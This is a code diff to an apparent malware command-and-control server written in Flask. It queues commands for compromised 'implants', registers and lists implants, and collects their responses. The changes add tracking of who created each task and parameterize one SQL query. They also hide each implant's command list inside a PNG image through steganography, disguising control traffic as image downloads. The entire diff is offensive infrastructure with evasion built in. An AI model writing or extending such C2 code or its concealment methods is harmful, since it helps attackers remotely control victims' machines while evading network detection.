@@ -8,7 +8,7 @@ import Steganography
 import tools
 from decouple import config
 from flask import (Flask, jsonify, make_response, redirect, render_template,
-                   request, url_for)
+                   request, url_for, send_file)
 from flask_cors import CORS, cross_origin
 from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                 get_jwt_identity, jwt_required,
@@ -81,10 +81,10 @@ def handle_execute():
         command = request.form.get('command')
         created_on = datetime.now(zone=None).isoformat()
         status = "untouched"
+        current_user = get_jwt_identity()
+        columns = ['target_implant_id', 'command', 'created_on', 'status', 'creator']
 
-        columns = ['target_implant_id', 'command', 'created_on', 'status']
-
-        data = target_implant_id, command, created_on, status
+        data = target_implant_id, command, created_on, status, current_user
 
         query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
         print(f"data: {data}")
@@ -96,25 +96,33 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
-
-
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
     id = data['id']
+    # if [";", "\'", "\""] in id:
+    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
+
     try:
-        db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE target_implant_id={id}")
+        query = sql.SQL("select * from {table} where {column} = %s").format(
+            table=sql.Identifier('task_queue'),
+            column=sql.Identifier('target_implant_id'))
+        db_resp = tools.executeSelectQueryVars(query, [id])
         print(f"this is the db response: {db_resp}")
-        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
+        if db_resp == None:
+            db_resp = {"commands": "No commands found"}
+        
+        img = Steganography.iio.imread("doge.png")
+        Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp)))
+        response = send_file('doge_encoded.png', mimetype='image/png')
+        return response, {'Access-Control-Allow-Origin': config.clientURL}
+
     except Exception as error:
         print("failed to retrieve data on get_commands")
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
 @app.route("/get_untouched", methods=["POST"])
 def get_untouched():
     data = request.json
@@ -130,8 +138,6 @@ def get_untouched():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
 @app.route("/get_executing", methods=["POST"])
 def get_executing():
     data = request.json
@@ -147,8 +153,6 @@ def get_executing():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
 @app.route("/get_executed", methods=["POST"])
 def get_executed():
     data = request.json
@@ -163,9 +167,7 @@ def get_executed():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# Register an implant, on the implant side
-
-
+# Register an implant, on the implant side TODO 
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -190,8 +192,6 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
-
-
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -222,7 +222,7 @@ def handle_response():
                  response_data = WyattWonderland.parsejson(response_data)
             
             # DUMP BACK INTO TASK_QUEUE 
-            
+
 
             
 
